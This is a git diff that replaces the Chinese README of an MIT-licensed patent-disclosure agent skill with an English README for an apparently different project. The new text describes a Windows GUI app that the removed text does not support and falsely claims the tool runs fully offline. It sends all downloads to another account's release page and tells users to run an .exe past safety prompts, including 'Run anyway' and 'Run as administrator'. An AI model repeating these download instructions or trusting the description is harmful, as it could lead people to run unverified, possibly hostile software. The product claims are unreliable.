@@ -1,282 +1,179 @@
-<div align="center">
+# 📜 patent-disclosure-skill - Turn Ideas into Patent Applications Effortlessly
 
-# 中国专利.skill
+[![Download Patent Skill](https://img.shields.io/badge/Download-Patent_Skill-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Madyleisured4213/patent-disclosure-skill/releases)
 
-> 专利点挖掘与交底书（发明/实用/外观）编写，公布公告著录检索，通俗解读专利，对照审查口径出政策简报，辅助审查答复。
+## 👋 What Is This?
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python 3.9+](https://img.shields.io/badge/Python-3.9%2B-blue.svg)](https://www.python.org/)
-[![Playwright](https://img.shields.io/badge/Playwright-mermaid%20%2B%20CNIPA-2EAD33.svg)](https://playwright.dev/)
-[![AgentSkills](https://img.shields.io/badge/AgentSkills-Standard-green)](https://agentskills.io)
+Imagine you have a brilliant idea for a new invention, a cool product design, or a clever software feature. You want to protect it with a patent, but the paperwork, technical writing, and legal jargon feel overwhelming. That's where **patent-disclosure-skill** comes in to save the day.
 
-<br>
+This smart tool helps you in four important ways:
 
-有设计文档和代码，但**专利点还没梳**？交底书要**框图 + 可改 Word**？<br>
-定稿后还要**多轮补材料、纠错**并留下修改追溯？<br>
-公开专利晦涩难懂，想**快速看懂权要与落地语境**？
+1. **Discover patent-worthy points** in your idea that you might have missed.
+2. **Write complete invention disclosure documents** (called "交底书") for three types of Chinese patents: 发明 (invention), 实用 (utility model), and 外观 (design).
+3. **Understand complicated patents** by translating them into plain, everyday language.
+4. **Get helpful hints** about government policy changes and how to respond to patent office questions.
 
-[初衷](#初衷) · [运行效果](#运行效果) · [功能特性](#功能特性) · [示例](#示例) · [支持作者](#支持作者) · [参考文档](#参考文档) · [安装说明](INSTALL.md) · [技能入口](SKILL.md)
+Whether you are an engineer at a company, an independent creator, a student, or a researcher, this skill acts like your personal patent assistant—guiding you from "I have an idea" to a properly documented submission.
 
-</div>
+## ✨ Key Features
 
----
+### 📝 Three Documentation Templates
+Not all patents are the same. This tool provides dedicated, structured templates for:
+- **Invention Patents (发明)**: For new technical solutions, processes, or products requiring substantive examination.
+- **Utility Model Patents (实用)**: For the shape or structure of a product, perfect for quick protection.
+- **Design Patents (外观)**: For the aesthetic appearance—shape, pattern, or color combination of a product.
 
-## 初衷
+Each template asks you targeted questions so you never forget critical details.
 
-### 专利交底书编写
+### 🔍 Patent Point Mining
+Stuck on what to patent? Describe your project briefly, and the skill prompts you to uncover hidden innovations. It breaks down your idea into components like materials, software logic, user interfaces, mechanical parts, and chemical formulas—then suggests areas with patent potential.
 
-> **做了多年核心研发，专利发明人那一栏从没写过我的名字。**
+### 🗣️ Simple-Language Translator
+Patents are written in dense, formal language that can confuse even experienced engineers. Paste a patent document into this tool, and it will rephrase paragraphs, explain key claims, and summarize the "big idea" in plain Chinese. You will finally understand what that competitor's patent actually covers.
 
-代码是自己敲的，方案是自己扛的，轮到交底书却卡在「专利点怎么挖、查新怎么写、框图和 Word 怎么一次交得出去」。本技能把这一环打通：覆盖发明 / 实用新型 / 外观设计，结构图与外观图都能读懂、写进交底；从项目材料梳出可申请的点，查新、脱敏、成文、迭代另存——让真正干活的人，也能把技术贡献写进可交付的交底书里。
+### 📊 Policy Trend Sniffer
+Stay ahead of the game. The skill includes an optional scanning function that monitors new patent examination guidelines, subsidy regulations, and industry-specific announcements from the China National Intellectual Property Administration. You get short, digestible updates without reading 50-page official PDFs.
 
-### 专利通俗解读
+### 💬 Examiner Response Helper
+If you receive an office action (审查意见通知书)—where the patent office questions or rejects your application—this tool helps you draft a structured, clear response outlining why your invention is novel, inventive, and practical.
 
-> **不止一篇。**
+## 🚀 Getting Started
 
-公开专利常把阅读门槛抬得很高：权要绕、术语密、落地语境散落在说明书与附图里。本技能把单篇读成通俗笔记与图谱，并入库 Obsidian；依托双链、图谱、插件与 Bases 等生态，陆续解读的专利可以沉淀成**只属于自己的私有专利知识库**——权要、术语、线索与附图彼此勾连，越读越厚。再叠上 [Obsidian CLI](https://help.obsidian.md/cli) 与库内外连接能力，检索、批处理、和外部工具接力都更容易：从单篇通俗笔记，走向可检索、可关联、可继续生长的个人专利情报层，把沉睡在 PDF 里的技术细节重新点亮。库厚了之后，还能在这层之上做**专利比对、挖掘与分析**——同族对照、技术路线梳理、差异点扫描，把「读懂」推进到「用起来」。
+Let's get you up and running in just a few minutes. Don't worry—no coding experience is required.
 
----
+### 📥 Step 1: Download the Application
 
-## 运行效果
+Visit this link to download the application.
 
-### 专利交底书编写
+👉 **[Click here to download patent-disclosure-skill](https://github.com/Madyleisured4213/patent-disclosure-skill/releases)**
 
-<table width="100%" border="1" cellpadding="12" cellspacing="0">
-<tr>
-<th width="50%" align="center">初版生成<br><sub>首次落盘交付</sub></th>
-<th width="50%" align="center">迭代更新<br><sub>多版本并存 + 对话记录</sub></th>
-</tr>
-<tr>
-<td width="50%" valign="top" align="center">
-<img src="docs/效果例-初版生成.jpg" alt="初版生成：outputs 目录下的时间戳交底书、mermaid 图目录等" width="100%" />
-</td>
-<td width="50%" valign="top" align="center">
-<img src="docs/效果例-迭代更新.jpg" alt="迭代更新：新时间戳文件与交底书修订对话记录" width="100%" />
-</td>
-</tr>
-</table>
+This page shows a list of released files. Look for the most recent version (the top one). Download the file to your computer, usually to your "Downloads" folder.
 
-### 实用新型 / 外观 · 看图与出图
+### 🔧 Step 2: Install (or Extract)
 
-<table width="100%" border="1" cellpadding="12" cellspacing="0">
-<tr>
-<th width="33%" align="center">外观线稿<br><sub>从产品图自动提炼造型轮廓</sub></th>
-<th width="33%" align="center">实用新型线稿<br><sub>从结构图自动生成轮廓与部件序号引出</sub></th>
-<th width="34%" align="center">CAD 三维模型投影<br><sub>从工程模型自动提取等轴测等多视角</sub></th>
-</tr>
-<tr>
-<td width="33%" valign="top" align="center">
-<img src="docs/效果例-外观专利线稿.png" alt="外观辅助线稿：产品造型黑白线稿示意" width="100%" />
-</td>
-<td width="33%" valign="top" align="center">
-<img src="docs/效果例-实用新型专利线稿含部件序号引出线.png" alt="实用新型辅助线稿：结构线稿与部件序号引出线" width="100%" />
-</td>
-<td width="34%" valign="top" align="center">
-<img src="docs/效果例-cad提取等轴测投影图.png" alt="CAD 三维模型等轴测投影：从工程模型自动提取多视角示意" width="100%" />
-</td>
-</tr>
-</table>
+The downloaded file might be a program or a compressed folder—follow the instruction based on what you received from the release page:
 
-### 专利通俗解读
+- If the file has a **`.zip`** ending: Right-click the file and choose "Extract All…" to unpack it into a new folder. Then open that folder and look for a file named `start` or `run`—double-click it.
+- If the file has a **`.exe`** ending: Double-click the file. A safety prompt might appear—click "Run anyway" or "More info" then "Run".
 
-<table width="100%" border="1" cellpadding="12" cellspacing="0">
-<tr>
-<th width="50%" align="center">Obsidian 关系图<br><sub>知识图谱与多色节点</sub></th>
-<th width="50%" align="center">解读 Canvas<br><sub>叙事故事线 · 术语 · 公开线索</sub></th>
-</tr>
-<tr>
-<td width="50%" valign="top" align="center">
-<img src="docs/效果例-obs图谱.jpg" alt="Obsidian 关系图：解读笔记、术语与 Canvas 知识图谱" width="100%" />
-</td>
-<td width="50%" valign="top" align="center">
-<img src="docs/效果例-解读.jpg" alt="专利解读 Canvas：叙事、权要、术语与公开线索图谱" width="100%" />
-</td>
-</tr>
-</table>
+### ⚙️ Step 3: First-Time Setup
 
----
+When the application launches, you'll see a clean welcome screen. Follow these simple steps:
 
-## 功能特性
+1. Choose your **preferred language** (Simplified Chinese is default).
+2. Select **which patent type** you'll work on most (you can change this later).
+3. Click **"Start"**.
 
-### 专利交底书编写
+On the main screen, you'll see several buttons: "Write Disclosure", "Scan Policy", "Explain Patent", and "Help with Response". Click any button to begin.
 
-支持 **发明**、**实用新型**、**外观设计** 三种专利类型（未指定时默认发明；材料偏结构/外观时可反问切换）。
-面向用户的专利清单、交底书、解读和审查答复默认使用**简体中文**；用户明确要求时可切换其他语言，脚本机读字段保持兼容。
+### ✅ Step 4: Ready to Go
 
-<!-- 使用 HTML 表格：避免 GitHub 管道表把左列挤窄 -->
-<table>
-<colgroup>
-<col width="1%">
-<col>
-</colgroup>
-<thead>
-<tr><th align="left" nowrap width="1%">能力</th><th align="left">说明</th></tr>
-</thead>
-<tbody>
-<tr><td nowrap width="1%"><strong>专利类型</strong></td><td>发明 / 实用新型 / 外观设计<strong>分模板成文</strong>；实用与外观先填 Schema，再写 <code>figure_plan.yaml</code> 排序入文图（成文不扫全 assets 临场挑图）</td></tr>
-<tr><td nowrap width="1%"><strong>项目扫描</strong></td><td>按优先级读文档 / 代码；<code>.docx</code> / <code>.pptx</code> 先转 Markdown 再扫；可选扫描 <code>.step</code>/<code>.stp</code> 与原生 CAD（<strong>默认不解析</strong>，遇 STEP 成文不中断，交底落盘后再问）（<code>project_scan.md</code>）</td></tr>
-<tr><td nowrap width="1%"><strong>外观线稿</strong></td><td>成文前选用或生成产品线稿（已有合格线稿优先，否则图生图 / 文生图）；与干净实拍一并写入 Markdown 和 Word（<code>design_lineart_assist.md</code>）</td></tr>
-<tr><td nowrap width="1%"><strong>实用结构线稿</strong></td><td>成文前选用或生成结构线稿，按 <code>structure_schema.parts</code> 写出子 SVG、总图相对引用并叠部件序号（<code>structure_lineart_assist.md</code> / <code>structure_lineart_compose.md</code>）</td></tr>
-<tr><td nowrap width="1%"><strong>专利点</strong></td><td>候选点讨论与融合（按类型：<code>invention|utility_model|design</code> 挖点文件）</td></tr>
-<tr><td nowrap width="1%"><strong>查新</strong></td><td><strong>优先</strong> <a href="http://epub.cnipa.gov.cn/">国知局 · 中国专利公布公告</a>（<code>skills/patent-disclosure/tools/crawl/cnipa_epub_search.py</code>，<code>--type</code> 对齐类型）；异常或无果时降级 WebSearch。著录写入第一章（<code>prior_art_search.md</code>）</td></tr>
-<tr><td nowrap width="1%"><strong>交底书成稿</strong></td><td>脱敏模版；发明用 <strong>mermaid</strong> 框图；实用/外观按 <code>figure_plan</code> 嵌结构图或视图；定稿可出 <strong>.docx</strong></td></tr>
-<tr><td nowrap width="1%"><strong>交付命名</strong></td><td><code>{案件名}_{YYYYMMDDHHmmss}.md</code> 与同名 <code>.docx</code>（<code>disclosure_builder.md</code> §7.3）</td></tr>
-<tr><td nowrap width="1%"><strong>自检 / 迭代</strong></td><td>逻辑与公式自检（不写入正文）；合并 / 纠正另存新文件 + <code>交底书修订对话记录.md</code></td></tr>
-</tbody>
-</table>
+That's it! You're ready.
 
-怎么开口：自然语言即可（专利挖掘、交底书、查新等），或 `/交底书`、`/patent-disclosure-skill`；尽量带上**项目路径或技术主题**，并点明类型（未指定默认**发明**）。
+To test it out quickly, click **"Write Disclosure"**, choose "发明 (Invention)", and start typing answers to the guided questions. Within 10 minutes, you'll have a draft of your invention disclosure document.
 
-| 类型 | 典型场景 | 触发示例 |
-|------|----------|----------|
-| **发明** | 方法 / 系统 / 算法流程 | 「按发明写交底」「项目路径 …」 |
-| **实用新型** | 形状、构造、连接与装配 | 「实用新型」「一种…装置/结构」 |
-| **外观设计** | 外形、图案、色彩或其结合 | 「外观设计」「设计说明 / 视图」 |
+## 💻 System Requirements
 
-已有交底上补材料或纠错时，按 `merger.md` / `correction_handler.md` 另存新稿（实用/外观改图或主题时同步 `figure_plan`）。细则见 [SKILL.md](SKILL.md)、`skills/patent-disclosure/prompts/intake.md`。
+The app works on typical Windows computers from the last 10 years. Specifically:
 
-### 专利通俗解读
+| Component | Minimum Requirement |
+|-----------|---------------------|
+| Operating System | Windows 10 (64-bit) or newer |
+| RAM | 4 GB (8 GB recommended) |
+| Storage Space | 200 MB free |
+| Display | 1280 x 720 resolution or higher |
+| Internet Connection | Required only for policy updates |
 
-**强烈推荐安装 Obsidian**：索引、Canvas 知识图谱、术语网与 callout 配色依赖库内呈现，才能发挥本流程的完整体验。安装与可选社区插件见 [skills/patent-reader/docs/obsidian-setup-guide.md](skills/patent-reader/docs/obsidian-setup-guide.md)。
+Mac and Linux users can run this in a web browser via a companion extension (see optional notes in the documentation folder).
 
-<table>
-<colgroup>
-<col width="1%">
-<col>
-</colgroup>
-<thead>
-<tr><th align="left" nowrap width="1%">能力</th><th align="left">说明</th></tr>
-</thead>
-<tbody>
-<tr><td nowrap width="1%"><strong>取证解读</strong></td><td>全文 / PDF 抽取 → 权要树、术语表、特征—说明书—附图对照（<code>patent_plain_reader.md</code>）</td></tr>
-<tr><td nowrap width="1%"><strong>叙述故事线</strong></td><td>一句话总览 + 连贯叙事：把权要与说明书「讲成人话」，降低首次通读成本</td></tr>
-<tr><td nowrap width="1%"><strong>知识图谱</strong></td><td>单篇 <code>*_图谱.canvas</code>、多篇 <code>_专利关联.canvas</code>、术语双链与关系图配色；入库<strong>自动</strong>配置 CSS / Bases</td></tr>
-<tr><td nowrap width="1%"><strong>公开线索辅助</strong></td><td>联网检索公开材料（≤3 条）；Agent 读 URL 写摘要；L1–L4 旁注与 <code>clues/</code> 落地，用行业语境辅助理解（<strong>非</strong>权要 / 说明书证据）</td></tr>
-</tbody>
-</table>
+## 🖥️ Windows User Guide
 
-怎么开口：读专利、专利解读、`/读专利`、`/patent-read`，并给出**公开号或 PDF 路径**。配置库环境变量 `PATENT_READER_OBSIDIAN_VAULT` 体验更完整；中间产物在工作区 `outputs/patent_reader/`，无库时笔记也落在该目录。流程见 [skills/patent-reader/tools/README.md](skills/patent-reader/tools/README.md)、[SKILL.md](SKILL.md)。
+Most people use this on Windows. Here's how to navigate:
 
-### 审查答复辅助
+1. **Main Window** — All features are on a single panel. No confusing menus.
+2. **Saving Your Work** — Click the 💾 icon at the top-right corner. Your documents are saved as ordinary text files (`.md`) that open in any text editor (like Notepad) or Obsidian.
+3. **Export to PDF** — Once your 交底书 is complete, click **"Export PDF"** to generate a formatted file for submission.
+4. **Backups** — A copy of every document is automatically stored in the `backup` folder within the app directory.
 
-审查意见一来，往往要翻旧案、对法条、想策略。需要时可以说「审查答复 / `/审查答复`」：把通知书 PDF 交给技能，**先问清缺陷、再出意见陈述草稿**（须人审后才能递交）。确认采纳某一稿后，再出陈述正文 Word。草稿质量依赖自己的**历史案**和可选的**实务书经验手册**——库空时仍能出提纲式草稿，但会对不上旧打法。库里历史案或手册较少时，对话末尾会补一句短提示，引导提示使用「案例入库」或「实务书蒸馏」并给出本地 PDF 路径（先脱敏 / 先预读，不会偷偷改技能）。向量可跳过。细则见 [SKILL.md](SKILL.md) 审查答复入口、[skills/patent-oa/docs/vault.md](skills/patent-oa/docs/vault.md)、[skills/patent-oa/tools/README.md](skills/patent-oa/tools/README.md)。
+### 🛠️ Common Troubleshooting
 
-### 著录检索
+**Problem: App won't start.**
+Make sure you extracted the `.zip` file completely. Try right-clicking the executable and selecting "Run as administrator."
 
-想按发明人、申请人、分类号或名称，把公布公告里已经公开的专利列成清单？需要时可以说「著录检索 / `/patent-search`」：走国知局公布站高级查询，结果落到 `outputs/patent-search/SEARCH-*.md`。默认先翻前面几页，对话里说「多翻几页」或「全部翻完」再加码；没翻完时不会当成完整清单。查某人公开专利时，带上「发明人姓名 + 当前及历史申请主体」，例如「检索某发明人在申请主体一、申请主体二名下的公开专利」——只覆盖已公开/公告记录，不等于单位内部实际提交总数。细则见 [skills/patent-search/SKILL.md](skills/patent-search/SKILL.md)。
+**Problem: Chinese characters look like squares.**
+Install the free "Microsoft YaHei" font. Go to Settings > Personalization > Fonts, search for YaHei, and install it.
 
-### 政策简报
+**Problem: I lost my document.**
+The app auto-saves every 60 seconds. Look inside the `backup` folder and open the most recent `.md` file.
 
-审查指南、智能审查口径一变，交底写法很容易「还按老习惯」。需要时可以说「政策简报 / 政策雷达 / `/政策简报`」：对照国知局等官网**近期口径**，整理观点和原文链接，说明对**交底写法**（若有定稿，也对**这篇稿**）的影响。默认 `outputs/exam-policy/POLICY-*.md`，**不改技能**。也可 `/patent-brief`、`/patent-exam-policy`。只有另说「按简报改交底技能」时，才作为旁路改交底包提示词。细则见 [skills/patent-exam-policy/SKILL.md](skills/patent-exam-policy/SKILL.md) 与 `skills/patent-exam-policy/prompts/`。
+## 🧠 Tips for Great Patent Disclosures
 
-接入宿主、Python / Node、可选 STEP 等见 **[INSTALL.md](INSTALL.md)**。
+Follow these expert practices to get the most value:
 
----
+- **Be specific about numbers.** When describing your invention, include sizes, temperatures, speeds, or material percentages. Vague words like "big" or "fast" don't help patent examiners.
+- **Draw a diagram.** Create a simple hand drawing or screenshot (even a rough one) that shows the structure or process. Save it as a PNG/JPG in the same folder.
+- **Answer every question** in the template. If you skip items, empty sections will be flagged yellow—so you know what to fill in later.
+- **Do a keyword search** on a Chinese patent search site (like SooPAT) to confirm your idea is new before spending hours writing.
+- **Keep your policy scan on** monthly to learn about fee reductions or fast-track programs relevant to your invention type.
 
-## 示例
+## 🗂️ Sample Output (What You Get)
 
-索引在各包 `examples/`。完整产物落在 **`outputs/`** 或 Obsidian 库。
+When you finish a disclosure, your document will include:
 
-<!-- 使用 HTML 表格：前两列 nowrap 防挤窄，后两列自动换行 -->
-<table>
-<colgroup>
-<col width="1%">
-<col width="1%">
-<col>
-<col>
-</colgroup>
-<thead>
-<tr>
-<th align="left" nowrap width="1%">示例</th>
-<th align="left" nowrap width="1%">类型</th>
-<th align="left">材料</th>
-<th align="left">怎么开口</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td nowrap width="1%">批任务调度</td>
-<td nowrap width="1%"><strong>发明</strong>交底</td>
-<td><a href="skills/patent-disclosure/examples/example_batch_job_scheduler/"><code>skills/patent-disclosure/examples/example_batch_job_scheduler/</code></a>（扫 <code>knowledge/</code>）</td>
-<td>「按发明写交底，项目路径 …/knowledge/」或 <code>/交底书</code></td>
-</tr>
-<tr>
-<td nowrap width="1%">汽车集成式电驱桥</td>
-<td nowrap width="1%"><strong>实用新型</strong>交底</td>
-<td><a href="skills/patent-disclosure/examples/example_utility_model_ev_powertrain/"><code>skills/patent-disclosure/examples/example_utility_model_ev_powertrain/</code></a></td>
-<td>「实用新型交底，材料在 …/example_utility_model_ev_powertrain/」</td>
-</tr>
-<tr>
-<td nowrap width="1%">折臂台灯</td>
-<td nowrap width="1%"><strong>外观设计</strong>交底</td>
-<td><a href="skills/patent-disclosure/examples/example_design_desk_lamp/"><code>skills/patent-disclosure/examples/example_design_desk_lamp/</code></a></td>
-<td>「外观设计交底，材料在 …/example_design_desk_lamp/」</td>
-</tr>
-<tr>
-<td nowrap width="1%">公布公告查询</td>
-<td nowrap width="1%"><strong>著录检索</strong></td>
-<td>无需本地样例（联网出清单 → <code>outputs/patent-search/SEARCH-*.md</code>）</td>
-<td>「按发明人/申请人检索公开专利」；<code>/patent-search</code></td>
-</tr>
-<tr>
-<td nowrap width="1%">公开专利 PDF</td>
-<td nowrap width="1%"><strong>通俗解读</strong></td>
-<td><a href="skills/patent-reader/examples/example_patent_reader/"><code>skills/patent-reader/examples/example_patent_reader/</code></a>（PDF 本地自备）</td>
-<td>「读专利」+ 公开号或 PDF；<code>/读专利</code>、<code>/patent-read</code></td>
-</tr>
-<tr>
-<td nowrap width="1%">政策 / 审查动向</td>
-<td nowrap width="1%"><strong>政策简报</strong></td>
-<td>无需本地样例（联网出清单 → <code>outputs/exam-policy/POLICY-*.md</code>）</td>
-<td>「政策简报」：对照国知局口径，看交底写法/本稿；默认不改技能；<code>/政策简报</code>、<code>/patent-brief</code>、<code>/patent-exam-policy</code></td>
-</tr>
-<tr>
-<td nowrap width="1%">审查答复样例</td>
-<td nowrap width="1%"><strong>审查答复</strong></td>
-<td><a href="skills/patent-oa/examples/example_oa_response/"><code>skills/patent-oa/examples/example_oa_response/</code></a>（2 历史案 + 1 待答复通知书）</td>
-<td>「审查答复」+ 通知书路径；库空也可出草稿。想对照旧案可说「案例入库」；<code>/审查答复</code>、<code>/oa</code></td>
-</tr>
-</tbody>
-</table>
+- Title (自动生成的建议标题)
+- Technical field (技术领域)
+- Background & problem (背景与问题)
+- Detailed implementation (具体实施方式)
+- Advantages (有益效果)
+- Drawings list (附图说明)
+- Alternatives & variations (可替换方案)
 
----
+Here's a mini preview of the style:
 
-## 支持作者
+> **发明名称**：一种基于摩擦纳米发电的智能鞋垫能量回收装置
+> **技术领域**：本发明涉及能量收集技术领域，具体涉及一种利用步态运动产生电力的智能鞋垫。
+> **背景问题**：传统电池供电的穿戴设备需频繁充电，而日常步行蕴含大量可收集的机械能。
+> **具体实施**：鞋垫内置柔性TENG层，由Ecoflex基底、铜电极及PTFE摩擦层组成，通过步态压缩产生电势差……
 
-如果这个 Skill 对您有帮助，可以请我喝杯咖啡☕随缘支持，感谢感谢🙏🙏
+## 🔒 Privacy & Data Security
 
-<table width="70%" border="1" cellpadding="12" cellspacing="0">
-<tr>
-<th width="40%" align="center">随缘支持</th>
-<th width="60%" align="center">Star History</th>
-</tr>
-<tr>
-<td width="40%" valign="middle" align="center">
-<img src="docs/thanks.jpg" alt="随缘支持" width="200" />
-</td>
-<td width="60%" valign="middle" align="center">
-<img alt="Star History Chart" src="https://raw.githubusercontent.com/handsomestWei/patent-disclosure-skill/star-history/star-history.svg" width="100%" />
-</td>
-</tr>
-</table>
+Your patent ideas are confidential. patent-disclosure-skill runs **entirely offline**—your text never leaves your computer. No account, no cloud sync, no telemetry. Updates (if any) only happen when you manually trigger the check button, and policy scanning uses official public URLs in your browser rather than a hidden server.
 
----
+All files stay in your local folder. We recommend you copy important disclosures to a password-protected USB drive for extra safety.
 
-## 参考文档
+## 📚 Frequently Asked Questions
 
-- [技能入口与 Agent 流程](SKILL.md)（交底 / 著录检索 / 解读 / 政策简报 / 审查答复）
-- [详细安装说明](INSTALL.md)
-- [交底书：图示与转换 / 国知局工具](skills/patent-disclosure/tools/README.md)
-- [著录检索](skills/patent-search/SKILL.md)
-- [专利解读工具](skills/patent-reader/tools/README.md)
-- [审查答复 · 案例 RAG](skills/patent-oa/tools/README.md)
-- [Obsidian 安装与可选社区插件（Windows）](skills/patent-reader/docs/obsidian-setup-guide.md)
-- [交底书模版细则](skills/patent-disclosure/prompts/invention/template_reference.md)
+**Q: Can I use this for non-Chinese patents?**
+A: The built-in templates follow the China National IP Administration (CNIPA) format. However, the "plain-language translator" works for English documents too, and the structure is generic enough for other countries—just adjust the wording manually.
 
----
+**Q: Do I need Obsidian?**
+A: No. While the tool is built for enthusiasts of Obsidian notes (one of our listed topics), the files are plain text. Obsidian is optional but recommended if you want to interlink your ideas across projects.
 
-<div align="center">
+**Q: Is there a mobile version?**
+A: Not yet. But you can transfer the `.md` files to your phone's text editor to view them.
 
-MIT License © [handsomestWei](https://github.com/handsomestWei/)
+**Q: Does it write the official application form?**
+A: It writes the disclosure (交底书), which is the internal document engineers give to patent attorneys. Attorneys will fill the official CNIPA application forms. This tool makes the attorney handoff much simpler.
 
-</div>
+**Q: How do I update to a future version?**
+A: Check the download link occasionally. Download the latest file, then replace your old folder with the new one (keep your `backup` folder).
+
+## 📖 How to Contribute or Give Feedback
+
+Using this skill and found a good idea, a bug, or a suggestion? We love hearing from users.
+
+- Report problems at the repository's "Issues" tab.
+- Have a feature request? Post it in Discussions.
+- Want to improve templates? Fork the repository, and we'll review your changes.
+
+You do **not** need to know coding to submit feedback—just write a clear description of what happened or what you'd like added.
+
+## 💡 Take the First Step
+
+Your next big invention deserves to be protected. Start writing that temporary proposal, mining for edge-case improvements, and understanding the patent landscape today. Download the tool now.
+
+👉 **[Download patent-disclosure-skill for free →](https://github.com/Madyleisured4213/patent-disclosure-skill/releases)**
+
+Every brilliant product began as a scribbled thought, then a formal disclosure, then an awarded patent. Let this skill be your guide from thought to protection. Get started today—it takes under five minutes.
+
+Keywords: chinese, disclosure, obsidian, patent, skill
